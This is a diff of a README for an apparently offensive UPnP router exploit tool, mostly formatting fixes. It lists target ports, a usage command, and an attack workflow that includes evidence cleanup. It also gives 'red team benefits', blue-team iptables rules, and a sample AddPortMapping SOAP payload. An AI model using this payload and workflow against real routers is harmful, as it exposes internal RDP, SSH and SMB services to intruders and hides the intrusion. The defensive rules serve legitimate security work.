@@ -11,6 +11,7 @@
 ## 🎯 Target Ports
 ```python
 ['21', '22', '23', '80', '443', '8080', '139', '445', '135', '3389', '110', '25', '49152']
+```
 
 ⚡ Attack Vectors
 Technique	SOAP Action	Risk
@@ -19,51 +20,41 @@ Firewall Bypass	NAT traversal via UPnP	🔥 Critical
 Service Exposure	Internal → External port mapping	🎯 Medium
 
 🛠️ Usage
-bash
-Copy
+```bash
 
 python3 upnp_exploit.py <router_ip> <network_prefix>
 # Example:
-python3 upnp_exploit.py 192.168.1.1 192.168.1
+python3 upnp_exploit.py external_ip local_ip
+```
 
 💀 Exploit Workflow
 
-    Recon
+Recon
+    Identifies UPnP service on port 49152
 
-        Identifies UPnP service on port 49152
+Weaponize
+    Injects port mapping rules via SOAP
 
-    Weaponize
+Verify
+    Checks if ports are externally accessible
 
-        Injects port mapping rules via SOAP
-
-    Verify
-
-        Checks if ports are externally accessible
-
-    Cleanup
-
-        Removes evidence via DeletePortMapping
+Cleanup
+    Removes evidence via DeletePortMapping
 
 🔥 Red Team Benefits
-
     Internal network pivoting
-
     RDP/SSH/SMB exposure
-
     Low detection rate (legitimate UPnP traffic)
 
 🛡️ Blue Team Countermeasures
-bash
-Copy
-
+```bash
 # Disable UPnP on routers:
 iptables -A INPUT -p tcp --dport 1900 -j DROP
 iptables -A INPUT -p udp --dport 1900 -j DROP
+```
 
 📜 Sample SOAP Payload
-xml
-Copy
-
+```xml
 <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
   <s:Body>
     <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
@@ -75,7 +66,5 @@ Copy
     </u:AddPortMapping>
   </s:Body>
 </s:Envelope>
-
-Run HTML
-
-    ⚠️ Warning: Use only on authorized systems. UPnP exploitation may violate security policies.
+```
+⚠️ Warning: Use only on authorized systems. UPnP exploitation may violate security policies.
